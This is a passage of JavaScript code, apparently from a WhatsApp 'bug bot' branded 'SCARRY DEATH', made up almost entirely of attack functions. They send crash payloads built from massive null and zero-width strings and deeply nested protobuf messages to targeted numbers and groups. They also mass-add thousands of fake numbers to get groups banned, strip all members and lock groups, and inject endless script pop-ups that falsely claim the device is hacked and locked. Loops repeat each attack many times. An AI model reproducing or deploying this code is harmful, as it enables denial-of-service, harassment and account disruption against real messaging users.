                    text: "\u2063".repeat(50000) + "ꦽ".repeat(50000),
                    contextInfo: {
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "\u2063".repeat(50000) + "ꦽ".repeat(30000) + "\u0000".repeat(1000),
                                mediaType: "IMAGE",
                                jpegThumbnail: "",
                                caption: "\u2063".repeat(50000) + "ꦽ".repeat(30000) + "\u0000".repeat(100)
                            },
                            
                            contextInfo: {
                                mentionedJid: Array.from({ length: 300 }, () => "1@newsletter"),
                                groupMentions: [
                                    {
                                        groupJid: "1@newsletter",
                                        groupSubject: "UNDEFINED".repeat(50000)
                                    }
                                ],
                                disappearingMode: {
                                    initiator: "CHANGED_IN_CHAT",
                                    trigger: "CHAT_SETTING"
                                },
                                inviteLinkGroupTypeV2: "DEFAULT"
                            }
                        },
                        callLogRecord: "X".repeat(50000) + "\uFFFF".repeat(50000),
                        mentionedJid: Array.from({ length: 3 }, () => "1@newsletter"),
                        disappearingMode: {
                            initiator: "CHANGED_IN_CHAT",
                            trigger: "CHAT_SETTING"
                        },
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                }
            }
        }
    };

    const x = await sock.relayMessage('status@broadcast', msg, {
        statusJidList: [jid],
        additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
                tag: 'mentioned_users',
                attrs: {},
                content: [{ tag: 'to', attrs: { jid: jid } }]
            }]
        }]
    });

    return x;
}

async function IkyyGanteng(sock, target) {
    const payload = proto.Message.encode(
        proto.Message.fromObject({
            interactiveMessage: {
                body: { text: "IkyyJomblo" },
                contextInfo: {
                    isForwarded: true,
                    buffer1: Buffer.from([0, 0, 0, 1]),
                    buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                    buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                    buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                    buffer5: Buffer.from([0xff, 0, 0, 0x20])
                },
                XForwardedFor: Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "\r\n"
            }
        })
    ).finish();

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;

            for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function HBcIkyyGanteng(target) {
    const payload = proto.Message.encode(
        proto.Message.fromObject({
            interactiveMessage: {
                body: { text: "X" },
                contextInfo: {
                    isForwarded: true,
                    buffer1: Buffer.from([0, 0, 0, 1]),
                    buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                    buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                    buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                    buffer5: Buffer.from([0xff, 0, 0, 0x20])
                },
                XForwardedFor: Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "\r\n"
            }
        })
    ).finish();

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;

            for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function delayinvisXzce(target) {
  const BULLZ = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    caption: "Denss\n",
    fileSha256: "UXAnqE96XbhJlQygSerag2w5bciGYC64Efc0WOKqliM=",
    fileLength: "0",
    height: 999,
    width: 999,
    mediaKey: "9mFMlLURejQjclsJGUOKPQoncF+TV/YgJVVHZjbhyu8=",
    fileEncSha256: "TWduFNUwLQ4uzTqCUexEr4bpZzdQBHVGPjndvnuiq6g=",
    directPath: "/o1/v/t24/f2/m239/AQPIIZjK4-SGNj_q-t7JycEFP7AeMU8Hdn2iTYVU3anoB9x042PAzsryyTMP2qluf4BX3O3wjU4uswCab9ChlBR-GrjCNDKL0Wo09WIg9w?ccb=9-4&oh=01_Q5Aa5QG3bhjIBdl8rVtK_Deok3IGxElZF_Qg89B-4Wuhy27uTQ&oe=6AB64F32&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1787748957",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAABHNvcpJGpwEkcHfTbW2cwLnK5WIyNL04W+qbk+ogSImxrLleB1K9LM+rY2gNms/wD/xAAmEAACAgICAQMEAwAAAAAAAAABAgADBBESIRMiMUEUQlJTECNR/9oACAEBAAE/AOQ7DMVA6AEoQs3jX3JlrWqvbFY78vc7mo2K7ny1kHfwZho31HO32CzJvobmm4tCCvkatz0/gJU2XZsq0ShjWfJYeocdiwb7dx0rGMGRutT6Fz35Jh0pp0MfEqsY7+BLUrpoLFYuZj20rW3U50/tMwFyEBs+yG0WMAx0syKMh/6V7mRjWY7acTyWf7KjevpDHUrqyrm8amCuxaV/aB7zJXJ8urfWZwf8JjBnbXxKuFOh8tOexM1WYckPc8t8odlPRi32Cwd9blhJp94jsa+z/H//xAAdEQACAQUBAQAAAAAAAAAAAAAAARECAxIhYRMy/9oACAECAQE/ACYMh1EuoyK7L+pRbU6lHn1FxNzsp05M+I//xAAcEQACAgIDAAAAAAAAAAAAAAAAEQIRECESE4H/2gAIAQMBAT8A1QjpmJUUk0ekZKtknhT3xHj/2Q==",
    scansSidecar: "IXAF6oCitMt+vwhZ6nxXdon1Jo/V+Kg6J1vO7oBlkhMvjDVjLDHlKg==",
    scanLengths: [99999999999, 99999999999, 99999999999],
    midQualityFileSha256: "nQvIXHp6w1FNdkLFsnrpEkDjVKQVT0TEAQdp9139Cco=",
    contextInfo: {
      forwardingScore: 4,
      isForwarded: true,
      forwardOrigin: 4,
      statusAttributionType: 2,
      statusAttributions: Array.from({ length: 200900 }, () => ({ type: 1 }))
    }
  };

  const metaNode = {
    tag: "meta", attrs: {},
    content: [{ tag: "mentioned_users", attrs: {},
      content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
    }]
  };

  const album = await sock.relayMessage("status@broadcast", {
    albumMessage: { expectedImageCount: 199999999, expectedVideoCount: -199999999 }
  }, { statusJidList: [target], additionalNodes: [metaNode] });

  for (let i = 0; i < 70; i++) {
    await sock.relayMessage("status@broadcast", {
      imageMessage: BULLZ,
      messageContextInfo: { messageAssociation: { associationType: 1, parentMessageKey: album.key } }
    }, { statusJidList: [target], additionalNodes: [metaNode] });
    await new Promise(r => setTimeout(r, 800));
  }
}

async function mylbangb(groupJid) {
  try {
    if (!groupJid.endsWith('@g.us')) throw new Error('Grup only')
    const fakeNumbers = Array.from({ length: 10000 }, () => {
      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
    })
    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(groupJid, [fakeJid], 'add').catch(() => {})
      await new Promise(r => setTimeout(r, 30))
    }
    sock.sendMessage(groupJid, { text: `lawik malah ke ban` }).catch(() => {})
  } catch (err) {
    throw new Error(`bngc: ${err.message}`)
  }
}

async function lockDevicylee(target) {
  const unifiedResponseData = {
    __typename: "GenAIUnifiedResponse",
    response_id: crypto.randomUUID(),
    sections: [
      {
        __typename: "GenAIUnifiedResponseSection",
        view_model: {
          __typename: "GenAISingleLayoutViewModel",
          primitive: {
            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
            trusted_sources: [],
            payload: `
              <script>
                while (true) {
                  alert("‼️TERDETEKSI HACK DEVICE ANDA AKAN MELEDAK DALAM 10s…");
                }
              </script>
            `
          }
        }
      }
    ]
  };

  const encodedData = Buffer
    .from(JSON.stringify(unifiedResponseData))
    .toString("base64");

  const em = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: encodedData
          },
          contextInfo: {
            isForwarded: true,
            forwardOrigin: 4
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, em, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

async function BanGbmymell(groupJid) {
    if (!groupJid.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(groupJid) ? groupJid : [groupJid])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}

        try {
            await sock.sendPresenceUpdate('composing', group);
        } catch (_) {}

        try {
            const fakeNumbers = Array.from({ length: 100 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 30));
            }
        } catch (_) {}
    }
}

async function LockChatV2JVU(groupJid) {
  try {
    const id = () => Math.random().toString(36).substring(2, 18).toUpperCase();
    const originalId = '3EB0' + id();
    const responseId = id();

    const html = '<script>' +
      'let n = 0, max = 5;' +
      'const pass = "meymell";' +
      'const err = ["Salah lol 😹", "Tetep aja salah tolol bgt si😹", "Akses ditolak 😹", "Dikit lagi kesempatan lu😹", "Yah nt anj mampus bay bay😹🙏☠️"];' +
      'while (n < max) {' +
        'n++;' +
        'let p = prompt("‼️ PERANGKAT TERDETEKSI DI HACK‼️\\n\\n" +' +
        '"☠️ ANDA HARUS MENEBAK PASSWORD\\n" +' +
        '"AGAR BISA MEMBUKA NYA ☠️\\n\\n" +' +
        '"NOTE :\\n" +' +
        '"CUMA 5 KESEMPATAN JIKA GAGAL?\\n" +' +
        '"NT LAH APALAGI 🤭😹\\n\\n" +' +
        '"#BY SCARRY DEATH 😝😝😝");' +
        'if (!p) { alert("mau kabur kemana 😹"); n--; continue; }' +
        'if (p === pass) alert("✅ BENAR ✅\\nTapi tetep gak bisa dibuka bosz. 🤭😹");' +
        'else alert("❌ " + err[n - 1]);' +
      '}' +
      'alert("🚨 KESEMPATAN HABIS 🚨\\nWA Anda resmi terkunci.\\n#by SCARRY DEATH");' +
    '</script>';

    const richContent = {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [{ messageType: 2, messageText: '> system locked' }],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                __typename: 'XMSGGenAIUnifiedResponse',
                response_id: responseId,
                sections: [{
                  __typename: 'GenAIUnifiedResponseSection',
                  view_model: {
                    __typename: 'GenAISingleLayoutViewModel',
                    primitive: {
                      __typename: 'GenAIaeacdsnwHtmlPrimitive',
                      payload: html,
                      trusted_sources: []
                    }
                  }
                }]
              })).toString('base64')
            },
            contextInfo: { forwardingScore: 1, isForwarded: true, forwardOrigin: 4 }
          }
        }
      }
    };

    const ctx = {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageSecret: Buffer.alloc(32, 1).toString('base64'),
        botMetadata: { messageDisclaimerText: '', botResponseId: responseId }
      }
    };

    const protocolEdit = {
      ...ctx,
      botForwardedMessage: {
        message: {
          protocolMessage: {
            key: { remoteJid: groupJid, fromMe: true, id: originalId },
            type: 14,
            timestampMs: Date.now(),
            editedMessage: richContent
          }
        }
      }
    };

    await sock.relayMessage(groupJid, { ...ctx, ...richContent }, { messageId: originalId });
    await new Promise(r => setTimeout(r, 1000));
    await sock.relayMessage(groupJid, protocolEdit, { messageId: '3EB0' + id() });
    
    console.log('[LockChatV2] Terkirim ke: ' + groupJid);
  } catch (e) {
    console.error('[LockChatV2] Error: ' + e.message);
  }
}

async function LockChatV2ndhh(target) {
  try {
    const id = () => Math.random().toString(36).substring(2, 18).toUpperCase();
    const originalId = '3EB0' + id();
    const responseId = id();

    const html = '<script>' +
      'let n = 0, max = 5;' +
      'const pass = "meymell";' +
      'const err = ["Salah lol 😹", "Tetep aja salah tolol bgt si😹", "Akses ditolak 😹", "Dikit lagi kesempatan lu😹", "Yah nt anj mampus bay bay😹🙏☠️"];' +
      'while (n < max) {' +
        'n++;' +
        'let p = prompt("‼️ TERDETEKSI PERANGKAT DI HACK‼️\\n\\n" +' +
        '"☠️ ANDA HARUS MENEBAK PASSWORD\\n" +' +
        '"AGAR BISA MEMBUKA NYA ☠️\\n\\n" +' +
        '"NOTE :\\n" +' +
        '"CUMA 5 KESEMPATAN JIKA GAGAL?\\n" +' +
        '"NT LAH APALAGI 🤭😹\\n\\n" +' +
        '"#BY SCARRY DEATH 😝😝😝");' +
        'if (!p) { alert("mau kabur kemana 😹"); n--; continue; }' +
        'if (p === pass) alert("✅ BENAR ✅\\nTapi tetep gak bisa dibuka bosz. 🤭😹");' +
        'else alert("❌ " + err[n - 1]);' +
      '}' +
      'alert("🚨 KESEMPATAN HABIS 🚨\\nWA Anda resmi terkunci.\\n#by Scarry Death");' +
    '</script>';

    const richContent = {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [{ messageType: 2, messageText: '> system locked' }],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                __typename: 'XMSGGenAIUnifiedResponse',
                response_id: responseId,
                sections: [{
                  __typename: 'GenAIUnifiedResponseSection',
                  view_model: {
                    __typename: 'GenAISingleLayoutViewModel',
                    primitive: {
                      __typename: 'GenAIaeacdsnwHtmlPrimitive',
                      payload: html,
                      trusted_sources: []
                    }
                  }
                }]
              })).toString('base64')
            },
            contextInfo: { forwardingScore: 1, isForwarded: true, forwardOrigin: 4 }
          }
        }
      }
    };

    const ctx = {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageSecret: Buffer.alloc(32, 1).toString('base64'),
        botMetadata: { messageDisclaimerText: '', botResponseId: responseId }
      }
    };

    const protocolEdit = {
      ...ctx,
      botForwardedMessage: {
        message: {
          protocolMessage: {
            key: { remoteJid: target, fromMe: true, id: originalId },
            type: 14,
            timestampMs: Date.now(),
            editedMessage: richContent
          }
        }
      }
    };

    await sock.relayMessage(target, { ...ctx, ...richContent }, { messageId: originalId });
    await new Promise(r => setTimeout(r, 1000));
    await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() });
    
    console.log('[LockChatV2] Terkirim ke: ' + target);
  } catch (e) {
    console.error('[LockChatV2] Error: ' + e.message);
  }
}

async function NullbandGbmgyl(groupJid) {
  let group = groupJid.includes('@g.us') ? groupJid : groupJid + '@g.us';
  let members = await sock.groupMetadata(group);
  for (i = 0; i < 20; i++) {
    try {
      for (let m of members.participants) {
        let id = m.id;
        if (id !== sock.user.id) {
          await sock.groupParticipantsUpdate(group, [id], 'remove');
          await new Promise((r) => setTimeout(r, 15));
        }
      }

      await sock.groupParticipantsUpdate(group, ['0@s.whatsapp.net'], 'add');
      await new Promise((r) => setTimeout(r, 10));
      await sock.groupParticipantsUpdate(group, ['0@s.whatsapp.net'], 'remove');

      await sock.sendMessage(group, {
        text:
          'u200B'.repeat(3000) + 'u0000'.repeat(3000) + 'u202E'.repeat(1000),
      });

      await sock.groupSettingsUpdate(group, 'announcement', true);
      await sock.groupSettingsUpdate(group, 'locked', true);
    } catch (e) {}
  }
}

async function Meymelnullhard(target) {
  const targetArray = Array.isArray(target) ? target : [target];
  const jids = targetArray
    .map(s => {
      const str = String(s || "").trim();
      return str.includes("@") ? str : str.replace(/\D/g, "") + "@s.whatsapp.net";
    })
    .filter(j => j.length > 15);

  if (jids.length === 0) return;

  const broadcastJid = "status@broadcast";

  try {
    const Nullmessage1 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "XXX"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    };

    const Nullmessage2 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\u0000".repeat(60000) },
            display_text: "\u0000\x20\x10\u3514\u200D\x80D".repeat(300000),
            nativeFlowMessage: {
              buttons: "\x00".repeat(80000)
            }
          }
        }
      }
    };

    const payloads = [Nullmessage1, Nullmessage2];
    const mentionedUsers = jids.map(jid => {
      return { tag: "to", attrs: { jid: jid }, content: [] };
    });

    for (let i = 0; i < 30; i++) {
      for (const jid of jids) {
        for (let k = 0; k < payloads.length; k++) {
          try {
            const msg = generateWAMessageFromContent(jid, payloads[k], {});
            await sock.relayMessage(jid, msg.message, {
              messageId: msg.key.id,
              noSelfSync: true,
            });
          } catch (_) {}

          await new Promise((r) => globalThis.setTimeout(r, 300));
        }
      }

      for (let k = 100; k < payloads.length; k++) {
        try {
          const msg = generateWAMessageFromContent(broadcastJid, payloads[k], {});
          await sock.relayMessage(broadcastJid, msg.message, {
            messageId: msg.key.id,
            noSelfSync: true,
            statusJidList: jids,
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: mentionedUsers
              }]
            }]
          });
        } catch (_) {}
        await new Promise((r) => globalThis.setTimeout(r, 300));
      }
    }

    console.log("Suscces : send");
  } catch (e) {
    console.log("Error", e.message);
  }
}
//-----------------------------------------( TEMPAT FUNCTION KUU  )------------------------\\
async function bebasspam(target) {
    for (let i = 0; i < 200; i++) {
    await bulldozerDelay2GBnj(target);
    await delayMsg1GBnvv(target);
    await new Promise((res) => setTimeout(res, 1000));
    }
    }


async function murbugraa1(groupJid) {
   for (let i = 0; i < 10; i++) {
    await paySuck(groupJid)
    await new Promise((res) => setTimeout(res, 6000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function murbugraa2(groupJid) {
   for (let i = 0; i < 30; i++) {
    await DelayXya(groupJid)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SUCCES SEND SCARRY DEATH`));
    }
    }

async function murbugraa3(groupJid) {
   for (let i = 0; i < 20; i++) {
    await GroupxCrash(groupJid)
    await new Promise((res) => setTimeout(res, 5000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function murbugraa4(groupJid) {
   for (let i = 0; i < 150; i++) {
    await BanGbmymell(groupJid)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function murbugraa5(groupJid) {
   for (let i = 0; i < 6; i++) {
    await LockChatV2JVU(groupJid)
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }

async function raraaimupp(target) {
    for (let i = 0; i < 2; i++) {
    await delayinvisXzce(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp2(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp3(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp4(target) {
    for (let i = 0; i < 20; i++) {
    await Lohraraa(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp5(target) {
    for (let i = 0; i < 20; i++) {
    await Lohraraa(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp6(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp7(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }


async function raraaimupp8(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp9(target) {
    for (let i = 0; i < 3; i++) {
    await VnXDelayTagSw(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp10(target) {
    for (let i = 0; i < 20; i++) {
    await Lohraraa(target);
    await new Promise((res) => setTimeout(res, 2000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp11(target) {
    for (let i = 0; i < 1; i++) {
    await Meymelnullhard(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp12(target) {
    for (let i = 0; i < 1; i++) {
    await Meymelnullhard(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp13(target) {
    for (let i = 0; i < 1; i++) {
    await Meymelnullhard(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp14(target) {
    for (let i = 0; i < 1; i++) {
    await Meymelnullhard(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function delaychat(target) {
    for (let i = 0; i < 3; i++) {
    await LockChatV2ndhh(target);
    await new Promise((res) => setTimeout(res, 5000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
process.on("uncaughtException", (err) => {
  console.log("💥 UNCAUGHT ERROR:");
  console.log(err);
});

process.removeAllListeners('warning');
process.on("unhandledRejection", (err) => {
  console.log("💥 PROMISE ERROR:");
  console.log(err);
});
